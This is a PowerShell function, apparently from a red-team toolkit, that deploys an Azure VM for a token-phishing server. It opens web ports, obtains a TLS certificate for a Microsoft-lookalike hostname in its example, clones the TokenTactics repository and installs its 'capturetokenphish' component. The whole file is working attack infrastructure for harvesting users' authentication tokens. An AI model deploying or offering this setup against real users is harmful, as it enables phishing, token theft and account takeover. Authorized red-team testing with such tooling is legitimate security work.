function Invoke-DeployCaptureServer {
    <#
    .DESCRIPTION
        Deploy the token capture setup in Azure
    .EXAMPLE
        Invoke-DeployCaptureServer -ResourceGroup Myresourcegroup -location eastus -vmName codecapture -vmPublicDNSName msftcodes -pubKey ./mykey.pub
    #>

    [cmdletbinding()]
    Param([Parameter(Mandatory=$true)]
    [string]$ResourceGroup,
    [Parameter(Mandatory=$false)]
    [string]$location = "eastus",
    [Parameter(Mandatory=$True)]
    [String]$vmName,
    [Parameter(Mandatory=$True)]
    [String]$vmPublicDNSName,
    [Parameter(Mandatory=$True)]
    [String]$pubKey
    )

Write-Output "Running Commands.."
Write-Output "az group create --name $ResourceGroup --location $location"
az group create --name $ResourceGroup --location $location
Start-Sleep -Seconds 5
Write-Output "az vm create --resource-group $ResourceGroup --name webinar --image Ubuntu2204 --public-ip-sku Standard --public-ip-address-dns-name $vmPublicDNSName --admin-username azureuser --ssh-key-values $pubKey"
az vm create --resource-group $ResourceGroup --name $vmName --image Ubuntu2204 --public-ip-sku Standard --public-ip-address-dns-name $vmPublicDNSName --admin-username azureuser --ssh-key-values $pubKey
Start-Sleep -Seconds 5
Write-Output "az vm open-port --port 80,443,8443 --resource-group $ResourceGroup --name $vmName"
az vm open-port --port 80,443,8443 --resource-group $ResourceGroup --name $vmName
Start-Sleep -Seconds 5
Write-Output "az vm run-command invoke -g $ResourceGroup -n $vmName --command-id RunShellScript --scripts 'apt-get update && apt-get install -y git python3-pip certbot wget apt-transport-https software-properties-common screen'"
az vm run-command invoke -g $ResourceGroup -n $vmName --command-id RunShellScript --scripts 'apt-get update && apt-get install -y git python3-pip certbot wget apt-transport-https software-properties-common screen'
Start-Sleep -Seconds 5
Write-Output "az vm run-command invoke -g $ResourceGroup -n $vmName --command-id RunShellScript --scripts 'wget -q https://packages.microsoft.com/config/ubuntu/`$(lsb_release -rs)/packages-microsoft-prod.deb'"
az vm run-command invoke -g $ResourceGroup -n $vmName --command-id RunShellScript --scripts 'wget -O /home/azureuser/packages-microsoft-prod.deb https://packages.microsoft.com/config/ubuntu/$(lsb_release -rs)/packages-microsoft-prod.deb'
Start-Sleep -Seconds 5
Write-Output "az vm run-command invoke -g $ResourceGroup -n $vmName --command-id RunShellScript --scripts 'dpkg -i /home/azureuser/packages-microsoft-prod.deb'"
az vm run-command invoke -g $ResourceGroup -n $vmName --command-id RunShellScript --scripts 'dpkg -i /home/azureuser/packages-microsoft-prod.deb'
Start-Sleep -Seconds 5
Write-Output "az vm run-command invoke -g $ResourceGroup -n $vmName --command-id RunShellScript --scripts 'apt-get update && apt-get install -y powershell'"
az vm run-command invoke -g $ResourceGroup -n $vmName --command-id RunShellScript --scripts 'apt-get update && apt-get install -y powershell'
Start-Sleep -Seconds 5
Write-Output "az vm run-command invoke -g $ResourceGroup -n $vmName --command-id RunShellScript --scripts 'sudo -i -u azureuser git clone https://github.com/rvrsh3ll/TokenTactics.git /home/azureuser/TokenTactics'"
az vm run-command invoke -g $ResourceGroup -n $vmName --command-id RunShellScript --scripts 'sudo -i -u azureuser git clone https://github.com/rvrsh3ll/TokenTactics.git /home/azureuser/TokenTactics'
Start-Sleep -Seconds 5
Write-Output "az vm run-command invoke -g $ResourceGroup -n $vmName --command-id RunShellScript --scripts 'certbot certonly --register-unsafely-without-email -d $vmPublicDNSName.eastus.cloudapp.azure.com --standalone --preferred-challenges http --non-interactive --agree-tos'"
az vm run-command invoke -g $ResourceGroup -n $vmName --command-id RunShellScript --scripts "certbot certonly --register-unsafely-without-email -d $vmPublicDNSName.eastus.cloudapp.azure.com --standalone --preferred-challenges http --non-interactive --agree-tos"
Start-Sleep -Seconds 5
Write-Output "az vm run-command invoke -g $ResourceGroup -n $vmName  --command-id RunShellScript --scripts 'sudo -i -u azureuser mkdir /home/azureuser/TokenTactics/capturetokenphish/certs'"
az vm run-command invoke -g $ResourceGroup -n $vmName --command-id RunShellScript --scripts 'sudo -i -u azureuser mkdir /home/azureuser/TokenTactics/capturetokenphish/certs'
Start-Sleep -Seconds 5
Write-Output "az vm run-command invoke -g $ResourceGroup -n $vmName --command-id RunShellScript 'cp /etc/letsencrypt/live/$vmPublicDNSName.eastus.cloudapp.azure.com/privkey.pem /home/azureuser/TokenTactics/capturetokenphish/certs/ && cp /etc/letsencrypt/live/$vmPublicDNSName.eastus.cloudapp.azure.com/cert.pem /home/azureuser/TokenTactics/capturetokenphish/certs/ && chown -R azureuser:azureuser /home/azureuser/'"
az vm run-command invoke -g $ResourceGroup -n $vmName --command-id RunShellScript --scripts "cp /etc/letsencrypt/live/$vmPublicDNSName.eastus.cloudapp.azure.com/privkey.pem /home/azureuser/TokenTactics/capturetokenphish/certs/ && cp /etc/letsencrypt/live/$vmPublicDNSName.eastus.cloudapp.azure.com/cert.pem /home/azureuser/TokenTactics/capturetokenphish/certs/ && chown -R azureuser:azureuser /home/azureuser/"
Start-Sleep -Seconds 5
Write-Output "az vm run-command invoke -g $ResourceGroup -n $vmName --command-id RunShellScript --scripts 'sudo -i -u azureuser pip3 install -r /home/azureuser/TokenTactics/capturetokenphish/requirements.txt'"
az vm run-command invoke -g $ResourceGroup -n $vmName --command-id RunShellScript --scripts 'sudo -i -u azureuser pip3 install -r /home/azureuser/TokenTactics/capturetokenphish/requirements.txt'
}
